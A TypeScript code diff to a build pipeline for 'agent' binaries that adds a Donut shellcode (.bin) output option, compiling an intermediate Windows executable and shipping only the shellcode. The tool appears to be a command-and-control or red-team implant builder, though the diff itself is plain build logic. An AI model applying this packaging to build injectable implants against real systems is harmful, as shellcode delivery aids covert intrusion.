@@ -1095,7 +1095,9 @@ func runBoundFiles() {
       const actualArch = goarm ? "arm" : arch;
       const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
       const namePrefix = config.outputName || "agent";
-      const winExt = config.outputExtension || ".exe";
+      const outputExtIsBin = config.outputExtension === ".bin";
+      // .bin = Donut shellcode output; compile as .exe internally, Donut produces the final .bin
+      const winExt = outputExtIsBin ? ".exe" : (config.outputExtension || ".exe");
       const outputName = deps.sanitizeOutputName(
         platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
@@ -1469,13 +1471,16 @@ func runBoundFiles() {
           }
         }
 
-        (build.files as any[]).push({
-          name: outputName,
-          filename: outputName,
-          platform,
-          version: agentVersion,
-          size: finalSize,
-        });
+        // When .bin is the output type, the intermediate PE is not the deliverable — Donut .bin is
+        if (!outputExtIsBin) {
+          (build.files as any[]).push({
+            name: outputName,
+            filename: outputName,
+            platform,
+            version: agentVersion,
+            size: finalSize,
+          });
+        }
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
         logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
